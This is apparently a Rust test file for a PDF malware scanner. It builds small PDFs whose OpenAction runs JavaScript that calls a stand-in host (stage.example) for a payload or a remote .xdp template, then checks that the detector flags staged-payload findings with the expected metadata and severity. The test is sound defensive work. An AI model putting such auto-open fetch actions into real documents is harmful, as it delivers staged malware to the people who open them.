mod common;

use common::default_scan_opts;
use sis_pdf_detectors::default_detectors;

fn build_pdf_with_objects(objects: &[&str]) -> Vec<u8> {
    let mut pdf = Vec::new();
    pdf.extend_from_slice(b"%PDF-1.4\n");
    let mut offsets = vec![0usize; objects.len() + 1];
    for object in objects {
        let obj_num = object
            .split_whitespace()
            .next()
            .and_then(|token| token.parse::<usize>().ok())
            .expect("object number");
        if obj_num < offsets.len() {
            offsets[obj_num] = pdf.len();
        }
        pdf.extend_from_slice(object.as_bytes());
    }
    let start_xref = pdf.len();
    let size = offsets.len();
    pdf.extend_from_slice(format!("xref\n0 {}\n", size).as_bytes());
    pdf.extend_from_slice(b"0000000000 65535 f \n");
    for offset in offsets.iter().skip(1) {
        if *offset == 0 {
            pdf.extend_from_slice(b"0000000000 00000 f \n");
        } else {
            pdf.extend_from_slice(format!("{offset:010} 00000 n \n").as_bytes());
        }
    }
    pdf.extend_from_slice(
        format!("trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n", size).as_bytes(),
    );
    pdf.extend_from_slice(start_xref.to_string().as_bytes());
    pdf.extend_from_slice(b"\n%%EOF\n");
    pdf
}

#[test]
fn staged_payload_finding_contains_stage_metadata() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Pages 3 0 R >>\nendobj\n",
        "2 0 obj\n<< /S /JavaScript /JS (app.launchURL('https://stage.example/payload');) >>\nendobj\n",
        "3 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let report = sis_pdf_core::runner::run_scan_with_detectors(
        &bytes,
        default_scan_opts(),
        &default_detectors(),
    )
    .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|finding| finding.kind == "supply_chain_staged_payload")
        .expect("supply_chain_staged_payload");
    assert_eq!(
        finding.meta.get("stage.sources").map(std::string::String::as_str),
        Some("action-trigger,javascript")
    );
    assert_eq!(
        finding.meta.get("stage.execution_bridge").map(std::string::String::as_str),
        Some("true")
    );
    assert_eq!(
        finding.meta.get("stage.execution_bridge_source").map(std::string::String::as_str),
        Some("action_trigger")
    );
    assert_eq!(
        finding.meta.get("stage.fetch_target_count").map(std::string::String::as_str),
        Some("1")
    );
    assert_eq!(finding.meta.get("stage.count").map(std::string::String::as_str), Some("1"));
}

#[test]
fn emits_unresolved_remote_template_finding() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Pages 3 0 R >>\nendobj\n",
        "2 0 obj\n<< /S /JavaScript /JS (var tpl='https://stage.example/template.xdp';) >>\nendobj\n",
        "3 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let report = sis_pdf_core::runner::run_scan_with_detectors(
        &bytes,
        default_scan_opts(),
        &default_detectors(),
    )
    .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|finding| finding.kind == "staged_remote_template_fetch_unresolved")
        .expect("staged_remote_template_fetch_unresolved");
    assert_eq!(
        finding.meta.get("stage.remote_template_indicators").map(std::string::String::as_str),
        Some(".xdp,template")
    );
    assert_eq!(
        finding.meta.get("stage.execution_bridge").map(std::string::String::as_str),
        Some("false")
    );
    assert_eq!(
        finding.meta.get("stage.sources").map(std::string::String::as_str),
        Some("action-trigger,javascript,remote-template-hint")
    );
    assert_eq!(finding.severity, sis_pdf_core::model::Severity::Medium);
}

#[test]
fn unresolved_remote_template_without_trigger_is_low_severity() {
    let objects = vec![
        "1 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n",
        "2 0 obj\n<< /S /JavaScript /JS (var tpl='https://stage.example/template.xdp';) >>\nendobj\n",
        "3 0 obj\n<< /Type /Pages /Count 0 >>\nendobj\n",
    ];
    let bytes = build_pdf_with_objects(&objects);
    let report = sis_pdf_core::runner::run_scan_with_detectors(
        &bytes,
        default_scan_opts(),
        &default_detectors(),
    )
    .expect("scan");

    let finding = report
        .findings
        .iter()
        .find(|finding| finding.kind == "staged_remote_template_fetch_unresolved")
        .expect("staged_remote_template_fetch_unresolved");
    assert_eq!(finding.severity, sis_pdf_core::model::Severity::Low);
    assert_eq!(
        finding.meta.get("stage.execution_bridge_source").map(std::string::String::as_str),
        Some("none")
    );
}
